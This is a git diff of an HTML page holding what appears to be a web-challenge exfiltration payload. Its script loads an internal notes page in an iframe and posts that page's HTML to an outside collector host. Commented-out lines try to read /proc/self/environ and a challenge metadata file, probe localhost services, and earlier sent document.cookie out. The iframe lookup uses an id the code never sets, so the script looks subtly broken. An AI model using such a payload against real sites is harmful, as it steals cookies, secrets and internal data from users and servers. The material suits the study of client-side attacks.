@@ -1,11 +1,21 @@
 <html>
   <body>
     <script>
+//       var link = document.createElement("button");
+//       link.name = "action";
+//       link.onclick = "history.go(-2)";
+//       document.body.appendChild(link);
+      var iframe = document.createElement('iframe');       
+      document.body.appendChild(iframe);
+      iframe.src = 'http://0.0.0.0:8080/notes';       
+      iframe.width = '200';
+      iframe.height = '400';
+//       link.click();
 //       var response = fetch('file:///challenge/metadata.json')
 //       var envr = fetch('file:///proc/self/environ')
 //       var local = fetch('http://localhost:4000')
 //       var localp = fetch('http://localhost:4000', {method: "post"})
-      var noted = fetch('http://0.0.0.0:8080/notes')
+//       var noted = fetch('http://0.0.0.0:8080/notes')
       fetch("https://enmocb6j3fxoq.x.pipedream.net/", {
         method: "post",
         body: JSON.stringify({
@@ -16,8 +26,8 @@
 //           env: JSON.stringify(envr),
 //           local: JSON.stringify(local),
 //           localp: JSON.stringify(localp),
-          noted: JSON.stringify(noted)
-          cookie: document.cookie,
+          noted: JSON.stringify(document.getElementById("iframe_id").contentWindow.document.documentElement.outerHTML)
+//           cookie: document.cookie,
         }),
       });
     </script>
